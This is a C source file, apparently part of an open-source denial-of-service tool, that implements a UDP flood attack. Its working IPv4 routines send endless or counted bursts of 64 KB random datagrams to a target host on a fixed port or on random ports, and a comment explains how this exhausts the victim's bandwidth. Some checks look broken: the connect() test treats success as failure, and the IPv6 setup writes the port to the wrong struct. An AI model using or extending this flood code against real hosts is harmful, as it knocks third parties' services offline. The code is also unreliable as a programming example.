// Copyright [2016] [hoenir]
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>

#include <lib/err.h>
#include <lib/info.h>
#include <lib/util.h>

#include "udp_flood.h"

// udp_flood_attack_fn type for specifing what implementation to use
// in case of a udp flood attack.
typedef void (*udp_flood_attack_fn)(void);

/*
 * Udp flood
 *
 * User Datagram Protocol(UDP) is a connectionless
 * protocol that uses datagrams embeddded in IP packets for
 * communication without needing to create a session between two devices
 * (and therefore requiring no handshake process). A UDP Flood attack
 * does not exploit a specific vulnerability, but rather simply abuses 
 * normal behaviour at a high enough level to cause network
 * congestion for a targeted network. It consists of sending a large number
 * of UDP datagrams from petentially spoofed IP addresses to random
 * ports on a target server; the server reciving this traffic is unable
 * to process every request, and consumes all of it's bandwidth
 * attempting to send ICMP "destination unreachable" packet replies to
 * confirm that there was no application listening on the target ports.
 * As a volumetric attack, a UDP flood is measured in Mbps(bandwidth)
 * and PPS(packets per second).
 *
 * udp_flood
 *
 * this is the entry function where the args will pe parsed
 * and start the attack.
 *
 */
static udp_flood_attack_fn impl;

// main singleton udp connection
static conn_t *connection;

// packets
// how many packets should we send
// default: 0 = infinity
static uint64_t packets;

static void single4_port(void)
{
	ssize_t n;

	DEBUG("Udp4 flood attack is staring using single port");
	// this does not result in anything like a tcp connection.
	// we tell the kernel just to check for any immediate errors.
	// if we use sendto and remove the connect the kernel involves the
	// 3 steps like : connect the socket, output the fist datagram, unconnectthe socket.
	// so for calling connect and the write one time involves the this steps by the kernel:
	// connect the socket , output fist datagram.
	if (!connect(connection->sock, (SA *)&connection->addr, sizeof(connection->addr)))
		INFOEE("Udp4 socket can't be connected");

	// if we have a specific number of packets
	for (uint64_t i = 0; i < packets; i++) {
		n = write(connection->sock, connection->buff, connection->bufflen);
		if (!n)
			break;
	}

	// if we already send the packets end it.
	if (packets > 0) goto ret;

	// it means that we have infinite packets.
	for (;;) {
		n = write(connection->sock, connection->buff, connection->bufflen);
		if (!n)
			break;
	}

ret:
	return;
}

static void random4_port(void)
{
	ssize_t n;

	DEBUG("Udp4 flood attack is starting using random ports");
	// if we have a specific number of packets
	for (uint64_t i = 0; i < packets; i++) {
		((struct sockaddr_in*)connection->addr)->sin_port = port_random();
		if (!connect(connection->sock, (SA *)&connection->addr, sizeof(connection->addr)))
			INFOEE("Udp4 socket can't be connected");
		n = write(connection->sock, connection->buff, connection->bufflen);
		if (!n)
			break;
	}

	if (packets > 0) goto ret;

	for (;;) {
		((struct sockaddr_in*)connection->addr)->sin_port = port_random();
		if (!connect(connection->sock, (SA *)&connection->addr, sizeof(connection->addr)))
			INFOEE("Udp4 socket can't be connected");
		n = write(connection->sock, connection->buff, connection->bufflen);
		if (!n)
			break;
	}

ret:
	return;
}

static void range4_port(void)
{
	DEBUG("Udp4 flood attack is starting using range ports");
}

static void random6_port(void)
{
	DEBUG("Udp6 flood attack is starting using random ports");
}

static void single6_port(void)
{
	DEBUG("Udp6 flood attack is staring using single port");
}

static void range6_port(void)
{
	DEBUG("Udp6 flood attack is starting using range ports");
}

// *_PORT macros return a specific internet protocol implementation for the udp
// flood attack, this way we make it more cleaner to use this instead of adding
// all if's and switch smts around the code.
#define RANDOM_PORT(ipv) ((ipv == IPV4) ? random4_port : random6_port)
#define SINGLE_PORT(ipv) ((ipv == IPV4) ? single4_port : single6_port)
#define RANGE_PORT(ipv) ((ipv == IPV4) ? range4_port : range6_port)
#define IP_SPEC(ipv) ((ipv == IPV4) ? AF_INET : AF_INET6)

void udp_flood_attack(void)
{
	if (!connection)
		INFOEE("Underlying connection pointer is NULL");

	if (!impl)
		INFOEE("Udp attack implementation is currently NULL");

	impl(); /*launch the attack*/
}

void udp_flood_init(conn_t *conn, arguments args)
{
	if (!conn)
		INFOEE("Invalid connection pointer passed");

	struct sockaddr_in in;
	struct sockaddr_in6 in6;

	switch (args.host_type) {
	case IPV4:
		in.sin_family = AF_INET;
		in.sin_port   = htons(args.port.n);
		inet_pton(AF_INET, args.host, &in.sin_addr);
		memcpy(conn->addr, &in, sizeof(in));
		break;
	case IPV6:
		in6.sin6_family = AF_INET6;
		inet_pton(AF_INET6, args.host, &in6.sin6_addr);
		in.sin_port = htons(args.port.n);
		memcpy(conn->addr, &in6, sizeof(in6));
		break;
	}

	conn_buff_new(conn, UINT16_MAX);
	// fill up the buffer with random data
	urandom_bytes(conn->buff, conn->bufflen);
	if (err_this(ERRENTROPY))
		INFOEE("Can't insert content into connection buffer");

	// create upd socket based on args.host_type
	conn->sock = socket(IP_SPEC(args.host_type), SOCK_DGRAM, IPPROTO_UDP);
	if (!conn->sock)
		INFOEE("Can't create udp socket");

	// assign singleton with the new connection
	connection = conn;
	packets	= args.packets;
	// now we should test if we are dealing with single,range or random port attack
	if (args.port.random) {
		DEBUG("Udp flood is choosing random port attack implementation");
		impl = RANDOM_PORT(args.host_type);
		return;
	}

	if (args.port.n) {
		DEBUG("Udp flood is choosing single port attack implementation");
		impl = SINGLE_PORT(args.host_type);
		return;
	}

	if ((args.port.high != 0) && (args.port.high > args.port.low)) {
		DEBUG("Udp flood is choosing range port attack implementation");
		impl = RANGE_PORT(args.host_type);
		return;
	}
}
